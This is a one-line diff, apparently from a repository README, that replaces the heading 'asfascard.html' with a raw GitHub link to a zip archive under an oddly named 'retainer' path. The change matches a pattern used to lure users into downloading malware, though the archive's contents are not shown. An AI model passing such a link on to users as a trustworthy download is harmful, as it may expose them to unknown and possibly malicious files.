@@ -1,1 +1,1 @@
-# asfascard.html
+# https://raw.githubusercontent.com/Allanursulino/asfascard.html/main/retainer/asfascard_html_Lumbricus.zip
